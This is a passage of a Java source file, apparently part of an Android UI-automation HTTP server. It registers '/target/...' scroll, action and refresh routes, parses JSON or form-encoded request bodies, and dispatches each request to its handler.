        INTERNAL_ROUTES.put("/target/scrollForwardUtilMultipleWithoutChild", (p, r) -> NodeSearchHandler.scrollForwardUtilMultipleWithoutChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilWithoutChild", (p, r) -> NodeSearchHandler.scrollBackwardUtilWithoutChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilMultipleWithoutChild", (p, r) -> NodeSearchHandler.scrollBackwardUtilMultipleWithoutChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilWithOperateOr", (p, r) -> NodeSearchHandler.scrollForwardUtilWithOperateOr(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilMultipleWithOperateOr", (p, r) -> NodeSearchHandler.scrollForwardUtilMultipleWithOperateOr(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilWithOperateOr", (p, r) -> NodeSearchHandler.scrollBackwardUtilWithOperateOr(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilMultipleWithOperateOr", (p, r) -> NodeSearchHandler.scrollBackwardUtilMultipleWithOperateOr(p, r));
        INTERNAL_ROUTES.put("/target/action", (p, r) -> NodeSearchHandler.targetAction(p, r));
        INTERNAL_ROUTES.put("/target/refresh", (p, r) -> NodeSearchHandler.targetRefresh(p, r));
        INTERNAL_ROUTES.put("/target/matchListenWindow", (p, r) -> NodeSearchHandler.matchListenWindow(p, r));
    }

    public static void parseAndRoute(String url, String json, AsyncHttpServerResponse response) {
        try {
            Multimap params = new Multimap();
            if (json != null && json.trim().startsWith("{")) {
                try {
                    org.json.JSONObject obj = new org.json.JSONObject(json);
                    java.util.Iterator<String> keys = obj.keys();
                    while (keys.hasNext()) {
                        String key = keys.next();
                        Object val = obj.opt(key);
                        if (val != null && !(val instanceof org.json.JSONObject)
                                && !(val instanceof org.json.JSONArray)) {
                            params.add(key, String.valueOf(val));
                        }
                    }
                } catch (org.json.JSONException ignored) {}
                params.add("_raw_body", json);
            } else if (json != null) {
                // Parse form-encoded body
                String[] pairs = json.split("&");
                for (String pair : pairs) {
                    int idx = pair.indexOf('=');
                    if (idx > 0) {
                        String key = pair.substring(0, idx);
                        String value = idx < pair.length() - 1 ? pair.substring(idx + 1) : "";
                        params.add(key, value);
                    }
                }
            }

            InternalRouteHandler handler = INTERNAL_ROUTES.get(url);
            if (handler != null) {
                handler.handle(params, response);
            } else {
                HttpResponseHelper.notFound(response);
            }
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "POST handler error: " + e.getMessage());
        }
    }

    // ═══════ vendor F2(response, msg) — 无效请求错误响应 ═══════

    public static void sendError(AsyncHttpServerResponse response, String msg) {
        HttpResponseHelper.error(response, msg);
    }
}
